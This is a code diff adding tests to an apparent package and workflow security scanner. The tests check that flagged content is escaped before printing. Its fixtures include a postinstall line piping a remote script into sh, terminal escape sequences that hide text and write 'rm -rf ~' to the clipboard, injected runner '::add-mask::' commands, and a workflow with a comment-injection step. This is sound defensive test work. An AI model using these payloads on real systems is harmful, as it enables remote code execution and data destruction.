@@ -164,3 +164,55 @@ def test_undecodable_workflow_name_still_reports(tmp_path):
     assert report_md.is_file() and report_sarif.is_file()
     # The name survives as a visible escape (`\udcff`), not as invalid UTF-8.
     assert "udcff" in report_md.read_text(encoding="utf-8")
+
+
+def _hostile_lines(text: str) -> list[str]:
+    """Lines a terminal would obey or a runner would read as a command."""
+    return [
+        line for line in text.splitlines()
+        if "\x1b" in line or "\x07" in line or "\r" in line
+        or line.lstrip().startswith(("::", "##["))
+    ]
+
+
+def test_scanned_package_cannot_drive_the_terminal(repo_root, tmp_path):
+    """`tridelphi scan` quotes the install script it flags. The package wrote
+    that script, so it chooses the bytes: ESC[8m would hide the rest of the
+    report — the DO NOT INSTALL verdict with it — and OSC 52 asks some
+    terminals to overwrite the clipboard."""
+    package = tmp_path / "evil"
+    package.mkdir()
+    (package / "package.json").write_text(json.dumps({
+        "name": "evil",
+        "version": "1.0.0",
+        "scripts": {
+            "postinstall": "curl -s http://203.0.113.9/a.sh | sh \x1b[8m\x1b]52;c;cm0gLXJmIH4=\x07"
+                           "\n::add-mask::DO NOT INSTALL",
+        },
+    }))
+    for fmt in ("checklist", "text"):
+        result = run_cli(["scan", str(package), "--format", fmt], cwd=repo_root)
+        assert result.returncode == 1, result.stderr
+        assert not _hostile_lines(result.stdout + result.stderr), fmt
+        assert "\\u001b[8m" in result.stdout, "the payload is shown, escaped"
+
+
+def test_workflow_names_cannot_drive_the_terminal_or_the_runner(repo_root, tmp_path):
+    """A pull request names its own workflow files and job ids, and the Action
+    prints the report into the runner's log, where a line starting `::` is a
+    command: `::add-mask::`, `::stop-commands::`, a forged `::error::`."""
+    workflows = tmp_path / ".github" / "workflows"
+    workflows.mkdir(parents=True)
+    try:
+        path = workflows / "x\n::add-mask::CRITICAL\n.yml"
+        path.write_text(
+            'on: issue_comment\njobs:\n  "b\\e[8m":\n    runs-on: ubuntu-latest\n'
+            "    permissions:\n      contents: write\n    steps:\n"
+            '      - run: echo "${{ github.event.comment.body }}" && curl https://x.example\n'
+        )
+    except (OSError, ValueError):
+        pytest.skip("this filesystem refuses control characters in file names")
+    for fmt in ("text", "checklist"):
+        result = run_cli([str(tmp_path), "--format", fmt], cwd=repo_root)
+        assert result.returncode == 1, result.stderr
+        assert not _hostile_lines(result.stdout + result.stderr), fmt
